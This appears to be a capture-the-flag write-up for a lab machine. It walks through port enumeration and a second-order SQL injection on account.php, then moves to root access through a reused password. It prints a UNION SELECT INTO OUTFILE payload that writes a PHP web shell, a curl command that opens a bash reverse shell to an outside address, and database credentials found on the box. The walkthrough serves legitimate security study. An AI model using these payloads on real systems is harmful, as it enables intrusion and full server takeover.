1, Enumerate the port 
22/tcp ssh
80/tcp http
4556/tcp http
8080/tcp http

2, Check these websites
port 80 :fuzz the web-content : but there is nothing useful for us
port 4566 :it give us the code 403 forbidden, so we guess it need cookies or something.
![](images/Pasted%20image%2020240731024054.png)
we have tried some existed user cookie, but it did not work.
So this port would be especially for admin or manager.

come to the main website,it use POST method to account.php.
then we can check our input on the next page, so we can try to get some SSTI vulners .

for the cookie, we can check its progress of creation.

3,exploition
Let's try some Sqlite injection
When we take `username=admin&country=Brazil'
the account.php would give us some error messages:
`**Fatal error**: Uncaught Error: Call to a member function fetch_assoc() on bool in /var/www/html/account.php:33 Stack trace: #0 {main} thrown in **/var/www/html/account.php** on line **33**`

So it clearly give us some evidence of sql injection has happened and it was a second order sql injection.

Let's exploit it and try to reverse a shell for us.
We can make a sqlite script or we can still use the burpsuite repeater.

The union select would be great but it would be very hard to check everything by ourselves.
`username=admin&country=Brazil' UNION SELECT 1-- -`
So we can make a file by using sql .
`username=admin&country=Brazil' UNION SELECT "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE
`'/var/www/html/shell.php'-- -`
then curl it and get the web shell and use it to make the reverse shell.
`curl 10.10.11.116/shell.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.16.3/443 0>&1"'`

4, enumerate the server and check the files.
firstly , the config.php has give us some useful infomation
	`  $servername = "127.0.0.1";
	  `$username = "uhc";
	  `$password = "uhc-9qual-global-pw";
	  `$dbname = "registration";`
	`$conn = new mysqli($servername, $username, $password, $dbname);`
So let's check the database and get some credits.

But there is nothing interesting in registration database!!!!!
So let's check another database mysql.
So upset , there is no passwords for local users or root.

But there is something surprise me, the root password is same as the database password!

then we can get root shell!


5, beyond the root.
when we try to exploit sql injection, If we do not have permission to write to the file, we can only use UNION select to enumerate the database, but manual operation is too inefficient, so we can use a script to save time.


